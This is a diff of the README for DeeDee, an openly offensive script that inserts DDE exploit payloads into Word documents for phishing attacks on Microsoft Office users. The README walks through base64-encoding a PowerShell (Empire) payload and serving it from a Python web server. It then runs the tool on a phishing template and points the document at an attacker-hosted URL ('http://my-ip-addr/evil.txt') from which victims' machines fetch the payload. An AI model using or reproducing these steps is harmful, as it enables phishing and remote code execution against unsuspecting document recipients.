@@ -1,6 +1,6 @@
 <h2> DeeDee Office Payload Generator<h6>Baking Evil Cookies since 2017<br>Author: True Demon</h2>
 
-<h3>Introduction##</h3>
+<h3>Introduction</h3>
 
 DeeDee is a script for quickly generating DDE Exploit payloads and inserting them into ready-made documents for
 phishing attempts against MS office users. The purpose of the script is to simplify and reduce the steps necessary to insert a
@@ -15,7 +15,7 @@ Start by creating a powershell payload that you would like to run on the remote 
 specified in the script later. Base64 encoding is definitely recommended for successful execution. Save the payload to a txt
 file in a temporary directory and start up a web server. The Python Simple HTTP server is sufficient, but any web server will do.
 
-EX:
+<b>EXAMPLE:</b>
 <pre>
 cd /tmp/payloads
 python3 http.server [port]
@@ -28,15 +28,14 @@ cp /tmp/empirepayload.txt /tmp/payloads/evil.txt
 
 <pre>
 <b>NOTE</b>: You must use the "blank.docx" file in /path/to/deedee/templates/ to start with. <br/>
-You can edit any part of this document
-before or after you have run deedee, provided that you DO NOT MODIFY THE FOOTER. 
-It is recommended you edit it beforehand and save it to the templates folder so that you use it again later
+You can edit any part of this document before or after you have run deedee, provided that you DO NOT MODIFY THE FOOTER.
+It is recommended you edit it beforehand and save it to the templates folder. This way, you can use it again later.
 </pre>
 
 <b>use -o to specify where you would like your output to go</b>
 <pre>
 deedee@thekitchen:/# ./deedee.py -i templates/myphishing.docx -o /tmp/payloads/evilcookies.docx
-</pre>
+
 Enter the path to your http server & empirepayload: 
 > http://my-ip-addr/evil.txt
 
